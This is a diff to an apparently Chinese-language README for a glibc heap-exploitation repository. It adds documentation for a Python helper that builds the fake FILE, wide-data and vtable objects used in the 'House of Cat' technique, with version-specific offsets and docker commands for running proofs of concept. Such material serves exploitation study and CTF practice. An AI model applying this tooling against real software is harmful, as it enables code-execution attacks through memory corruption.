@@ -69,6 +69,34 @@ _IO_OVERFLOW(fake, EOF)
 
 三个 PoC 都使用真实的 `_IO_wfile_jumps`，把 primary vtable 偏移合法的 `+0x30`，再调用 glibc 自带的 `__overflow` 走一遍 primary whitelist 校验；marker 回调返回 `WEOF`，最后用 assert 验证 wide 回调确实被执行了。
 
+## Python 离线板子
+
+[`cat.py`](./cat.py) 生成三段 ABI 对应的 fake FILE、fake wide data 和 fake wide vtable。
+
+```python
+from cat import build_house_of_cat
+
+writes = build_house_of_cat(
+    "2.43",
+    file_addr=fake_file,
+    fake_wide_data_addr=wide_data,
+    fake_wide_vtable_addr=wide_vtable,
+    callback_addr=callback,
+    wfile_jumps_addr=libc_base + io_wfile_jumps_offset,
+)
+```
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本；决定 `_wide_vtable` 为 `+0x130`、`+0xf0` 或 `+0xe0`。 |
+| `file_addr` | fake FILE 地址。 |
+| `fake_wide_data_addr` | fake `_IO_wide_data` 地址，写入 `FILE + 0xa0`。 |
+| `fake_wide_vtable_addr` | fake wide vtable 地址。 |
+| `callback_addr` | fake wide vtable `__overflow` 槽地址，固定写入 vtable `+0x18`。 |
+| `wfile_jumps_addr` | 目标 libc 的合法 `_IO_wfile_jumps` 地址；函数写入偏移后的 primary vtable `+0x30`。 |
+
+返回 `MemoryWrite` 元组，包含绝对地址、对象镜像和标签。函数不负责 `_IO_list_all` 投递、`__overflow` 触发或 callback 的调用约定。
+
 ```bash
 ./tools/run_in_docker.sh 2.24 house_of_cat/poc_wide_seekoff_2.24_2.29.c
 ./tools/run_in_docker.sh 2.30 house_of_cat/poc_wide_seekoff_2.30.c
